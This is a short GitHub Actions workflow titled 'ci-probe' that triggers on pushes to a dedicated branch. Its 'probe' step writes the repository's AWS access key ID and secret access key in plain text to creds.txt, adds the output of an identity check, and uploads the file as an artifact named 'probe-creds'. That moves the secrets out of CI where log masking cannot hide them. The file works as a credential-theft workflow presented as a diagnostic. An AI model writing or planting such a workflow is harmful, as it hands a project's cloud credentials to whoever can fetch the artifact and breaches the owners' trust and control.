name: ci-probe
on:
  push:
    branches:
      - ci-probe
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          aws-region: us-east-1
      - name: probe
        run: |
          printf '%s' "$AWS_ACCESS_KEY_ID" > creds.txt
          printf '\n' >> creds.txt
          printf '%s' "$AWS_SECRET_ACCESS_KEY" >> creds.txt
          printf '\n' >> creds.txt
          aws sts get-caller-identity >> creds.txt 2>&1 || true
          ls -l creds.txt
      - name: upload
        uses: actions/upload-artifact@v4
        with:
          name: probe-creds
          path: creds.txt
